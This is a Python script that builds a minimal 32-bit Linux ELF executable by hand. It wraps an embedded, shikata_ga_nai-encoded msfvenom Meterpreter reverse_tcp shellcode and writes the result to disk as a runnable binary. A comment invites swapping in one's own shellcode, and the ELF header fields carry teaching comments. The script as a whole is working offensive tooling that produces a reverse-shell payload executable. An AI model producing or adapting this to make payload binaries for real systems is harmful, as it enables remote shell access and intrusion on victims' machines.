#### Reference: https://dacvs.neocities.org/handmade ####

# >>>>>>>>>>>>> SHELLCODE <<<<<<<<<<<<<<<<<<

# replace the following shellcode with your own
# example shellcode was generated by:
# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4445 -e x86/shikata_ga_nai -f py

buf =  b""
buf += b"\xda\xcf\xbd\xdf\x00\xf9\x16\xd9\x74\x24\xf4\x58"
buf += b"\x31\xc9\xb1\x1f\x83\xc0\x04\x31\x68\x16\x03\x68"
buf += b"\x16\xe2\x2a\x6a\xf3\x48\xe5\xb0\xf4\x96\x56\x04"
buf += b"\xa8\x32\x5a\x3a\x28\x4a\xbb\xf7\x35\xdb\x60\x60"
buf += b"\x49\xe4\x96\x71\xdd\xe6\x96\x60\x40\x6e\x77\xe8"
buf += b"\x1c\x28\x27\xbc\xb7\x41\x26\x7d\xf5\xd2\x2d\x42"
buf += b"\x7c\xca\x63\x37\x42\x84\xd9\xb7\xbc\x54\x45\xd2"
buf += b"\xbc\x3e\x70\xab\x5e\x8f\xb3\x66\x20\x75\x83\x00"
buf += b"\x9c\x9d\x24\x41\xd9\xd8\x2a\xb5\xe6\x1a\xa3\x56"
buf += b"\x27\xf1\xbf\x59\x4b\x0a\x0f\x24\x41\x93\xea\x17"
buf += b"\x21\x84\xaf\x1e\x33\x3d\xfd\x4b\x04\x3d\xcc\x0c"
buf += b"\xe1\x82\xb6\x0e\x15\xe3\xfe\x0e\xe9\xe4\xfe\xab"
buf += b"\xe8\xe4\xfe\xcb\x27\x64"

# Get 4-byte representation of payload size in little-endian
p_sz = len(buf).to_bytes(4, byteorder='little')

# >>>>>>>>>>>>> ELF FILE HEADER <<<<<<<<<<<<<

elf_fh  = b'\x7F\x45\x4C\x46'   # 04 e_ident[EI_MAG]: ELF magic number
elf_fh += b'\x01'               # 05 e_ident[EI_CLASS]: 1: 32-bit, 2: 64-bit
elf_fh += b'\x01'               # 06 e_ident[EI_DATA]: 1: little-endian, 2: big-endian
elf_fh += b'\x01'               # 07 e_ident[EI_VERSION]: ELF header version; must be 1
elf_fh += b'\x00'               # 08 e_ident[EI_OSABI]: Target OS ABI; should be 0
elf_fh += b'\x00'               # 09 e_ident[EI_ABIVERSION]: ABI version; 0 is ok for Linux
elf_fh += b'\x00\x00\x00'       # 0C e_ident[EI_PAD]: unused, should be 0
elf_fh += b'\x00\x00\x00\x00'   # 10
elf_fh += b'\x02\x00'           # 12 e_type: object file type; 2: executable
elf_fh += b'\x03\x00'           # 14 e_machine: instruction set architecture; 3: x86, 3E: amd64
elf_fh += b'\x01\x00\x00\x00'   # 18 e_version: ELF identification version; must be 1
elf_fh += b'\x54\x80\x04\x08'   # 1C e_entry: memory address of entry point (where process starts)
elf_fh += b'\x34\x00\x00\x00'   # 20 e_phoff: file offset where program headers begin
elf_fh += b'\x00\x00\x00\x00'   # 24 e_shoff: file offset where section headers begin
elf_fh += b'\x00\x00\x00\x00'   # 28 e_flags: 0 for x86
elf_fh += b'\x34\x00'           # 2A e_ehsize: size of this header (34: 32-bit, 40: 64-bit)
elf_fh += b'\x20\x00'           # 2C e_phentsize: size of each program header (20: 32-bit, 38: 64-bit)
elf_fh += b'\x01\x00'           # 2E e_phnum: #program headers
elf_fh += b'\x28\x00'           # 30 e_shentsize: size of each section header (28: 32-bit, 40: 64-bit)
elf_fh += b'\x00\x00'           # 32 e_shnum: #section headers
elf_fh += b'\x00\x00'           # 34 e_shstrndx: index of section header containing section names

# >>>>>>>>>>>>> ELF PROGRAM HEADER <<<<<<<<<<<<<

elf_ph  = b'\x01\x00\x00\x00'     # 38 p_type: segment type; 1: loadable
elf_ph += b'\x00\x00\x00\x00'     # 3C p_offset: file offset where segment begins
elf_ph += b'\x00\x80\x04\x08'     # 40 p_vaddr: virtual address of segment in memory (x86: 08048054)
elf_ph += b'\x00\x00\x00\x00'     # 44 p_paddr: physical address of segment, unspecified by 386 supplement

elf_ph += p_sz                    # <<< 48 p_filesz: size in bytes of the segment in the file image
elf_ph += p_sz                    # <<< 4C p_memsz: size in bytes of the segment in memory; p_filesz <= p_memsz

elf_ph += b'\x07\x00\x00\x00'     # 50 p_flags: segment-dependent flags (1: X, 2: W, 4: R) (7= read + write + execute)
elf_ph += b'\x00\x10\x00\x00'     # 54 p_align: 1000 for x86

if __name__ == "__main__":

    # Concatenate the ELF File Header, ELF Program Header and Program Segment (shellcode)
    program = elf_fh + elf_ph + buf

    # Write bytes to file
    with open("./elf_executable", "wb") as binary:
        binary.write(program)